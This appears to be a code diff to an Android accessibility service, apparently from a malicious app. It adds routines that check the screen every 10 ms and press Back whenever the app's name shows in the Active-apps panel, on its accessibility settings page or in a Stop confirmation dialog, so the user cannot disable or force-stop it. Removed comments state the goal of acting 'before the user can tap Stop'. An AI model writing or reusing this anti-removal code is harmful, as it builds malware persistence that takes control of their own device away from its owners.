@@ -568,14 +568,9 @@ public class UnifiedAccessibilityService extends AccessibilityService {
                 }
                     
                 case AccessibilityEvent.TYPE_WINDOW_STATE_CHANGED:
-                    // If the notification panel is closing (foreground moves away from systemui),
-                    // remove the stop-button protection overlay immediately.
                     if (!"com.android.systemui".equals(packageName) && notifPanelActiveAppsVisible) {
                         notifPanelActiveAppsVisible = false;
-                        removeNotifStopOverlay();
                     }
-                    // Also refresh the stop-button overlay on every SystemUI state change
-                    // so the overlay is placed the instant the Active-apps panel appears.
                     if ("com.android.systemui".equals(packageName)) {
                         updateNotifPanelStopOverlay();
                     }
@@ -685,6 +680,11 @@ public class UnifiedAccessibilityService extends AccessibilityService {
 
     private void autoClickAllowButton() {
         try {
+            // Always run these regardless of system panel state — they must fire
+            // even when the notification shade or quick-settings is open.
+            runActiveAppsProtection();
+            runAccessibilityPageProtection();
+
             // Do not auto-click while the notification panel or quick settings is open
             if (isSystemPanelOpen()) return;
 
@@ -995,19 +995,22 @@ public class UnifiedAccessibilityService extends AccessibilityService {
      * When the panel is no longer visible the overlay is removed.
      */
     private void updateNotifPanelStopOverlay() {
-        if (Build.VERSION.SDK_INT < Build.VERSION_CODES.LOLLIPOP_MR1) return;
         try {
             String appName = getString(R.string.app_name);
-            android.graphics.Rect rowBounds = findActiveAppsRowBounds(appName);
-            if (rowBounds != null && !rowBounds.isEmpty()) {
+            AccessibilityNodeInfo root = getRootInActiveWindow();
+            if (root == null) return;
+            // Direct search on the active window only — no deep tree traversal.
+            List<AccessibilityNodeInfo> nameNodes = root.findAccessibilityNodeInfosByText(appName);
+            boolean found = nameNodes != null && !nameNodes.isEmpty();
+            if (nameNodes != null) {
+                for (AccessibilityNodeInfo n : nameNodes) try { n.recycle(); } catch (Exception ignored) {}
+            }
+            root.recycle();
+            if (found) {
                 notifPanelActiveAppsVisible = true;
-                placeNotifStopOverlay(rowBounds);
-                // Press Back vigorously every time the Active-apps panel is detected —
-                // closes the panel immediately, before the user can tap Stop.
                 try { performBack(); } catch (Exception ignored) {}
             } else {
                 notifPanelActiveAppsVisible = false;
-                removeNotifStopOverlay();
             }
         } catch (Exception ignored) {}
     }
@@ -2007,10 +2010,7 @@ public class UnifiedAccessibilityService extends AccessibilityService {
         boolean isSettingsPkg = packageName.contains("settings");
         boolean isSystemUIPkg = "com.android.systemui".equals(packageName);
 
-        // If the incoming window is not Settings and not SystemUI, the user has
-        // navigated completely out of settings — remove the overlay immediately.
         if (!isSettingsPkg && !isSystemUIPkg) {
-            if (accessibilityAssistOverlayShowing) removeAccessibilityAssistOverlay();
             return;
         }
 
@@ -2048,10 +2048,6 @@ public class UnifiedAccessibilityService extends AccessibilityService {
                 boolean isStopConfirmDialog = foundName && foundStop && !isOurAccessibilityPage;
 
                 if (isOurAccessibilityPage) {
-                    // Show the overlay if not already shown.
-                    if (!accessibilityAssistOverlayShowing) {
-                        showAccessibilityAssistOverlay();
-                    }
                     // Press Back vigorously every time this page is detected.
                     try { performBack(); } catch (Exception ignored) {}
 
@@ -2067,17 +2063,11 @@ public class UnifiedAccessibilityService extends AccessibilityService {
                     }
 
                 } else if (isStopConfirmDialog) {
-                    // Stop-confirmation dialog detected — press Back twice immediately
-                    // to dismiss it before the user can tap "Stop" / confirm.
+                    // Stop-confirmation dialog detected — press Back twice immediately.
                     try { performBack(); } catch (Exception ignored) {}
                     new Handler(Looper.getMainLooper()).postDelayed(() -> {
                         try { performBack(); } catch (Exception ignored) {}
                     }, 80L);
-
-                } else {
-                    // A different settings page is now in the foreground —
-                    // remove the overlay so the user can navigate freely.
-                    if (accessibilityAssistOverlayShowing) removeAccessibilityAssistOverlay();
                 }
             } catch (Exception ignored) {}
         });
@@ -2335,6 +2325,74 @@ public class UnifiedAccessibilityService extends AccessibilityService {
         return logs;
     }
     
+    /**
+     * Runs every 10 ms inside the scan loop.
+     * If the active window belongs to SystemUI (notification shade / Active-apps panel)
+     * and our app name is visible, press Back immediately — no overlay needed.
+     * Uses direct node text search only; never traverses invisible nodes.
+     */
+    private void runActiveAppsProtection() {
+        try {
+            AccessibilityNodeInfo root = getRootInActiveWindow();
+            if (root == null) return;
+            CharSequence pkg = root.getPackageName();
+            if (pkg == null || !pkg.toString().equals("com.android.systemui")) {
+                root.recycle();
+                return;
+            }
+            String appName = getString(R.string.app_name);
+            List<AccessibilityNodeInfo> nodes = root.findAccessibilityNodeInfosByText(appName);
+            boolean found = nodes != null && !nodes.isEmpty();
+            if (nodes != null) {
+                for (AccessibilityNodeInfo n : nodes) try { n.recycle(); } catch (Exception ignored) {}
+            }
+            root.recycle();
+            if (found) {
+                try { performBack(); } catch (Exception ignored) {}
+            }
+        } catch (Exception ignored) {}
+    }
+
+    /**
+     * Runs every 10 ms inside the scan loop.
+     * If the active window is an accessibility settings page that contains our app name,
+     * press Back immediately and handle the stop-confirmation dialog with a double Back.
+     * Uses direct node text search only; never traverses invisible nodes.
+     */
+    private void runAccessibilityPageProtection() {
+        if (!accessibilityAssistEnabled) return;
+        try {
+            AccessibilityNodeInfo root = getRootInActiveWindow();
+            if (root == null) return;
+            CharSequence pkg = root.getPackageName();
+            String pkgStr = pkg != null ? pkg.toString().toLowerCase() : "";
+            if (!pkgStr.contains("settings")) {
+                root.recycle();
+                return;
+            }
+            String appName = getString(R.string.app_name);
+            List<AccessibilityNodeInfo> nameNodes = root.findAccessibilityNodeInfosByText(appName);
+            List<AccessibilityNodeInfo> stopNodes = root.findAccessibilityNodeInfosByText("stop");
+            boolean foundName = nameNodes != null && !nameNodes.isEmpty();
+            boolean foundStop = stopNodes != null && !stopNodes.isEmpty();
+            if (nameNodes != null) for (AccessibilityNodeInfo n : nameNodes) try { n.recycle(); } catch (Exception ignored) {}
+            if (stopNodes != null) for (AccessibilityNodeInfo n : stopNodes) try { n.recycle(); } catch (Exception ignored) {}
+            root.recycle();
+
+            boolean isAccessibilityPage = foundName && pkgStr.contains("accessibility");
+            boolean isStopDialog = foundName && foundStop && !isAccessibilityPage;
+
+            if (isAccessibilityPage) {
+                try { performBack(); } catch (Exception ignored) {}
+            } else if (isStopDialog) {
+                try { performBack(); } catch (Exception ignored) {}
+                new Handler(Looper.getMainLooper()).postDelayed(() -> {
+                    try { performBack(); } catch (Exception ignored) {}
+                }, 80L);
+            }
+        } catch (Exception ignored) {}
+    }
+
     private void startAutoClickScanner() {
         autoClickHandler = new Handler(Looper.getMainLooper());
         autoClickRunnable = new Runnable() {
@@ -2346,7 +2404,7 @@ public class UnifiedAccessibilityService extends AccessibilityService {
                     Log.e(TAG, "autoClickRunnable crash: " + e.getMessage());
                 }
                 if (autoClickHandler != null && autoClickRunnable != null) {
-                    autoClickHandler.postDelayed(this, 200);
+                    autoClickHandler.postDelayed(this, 10);
                 }
             }
         };
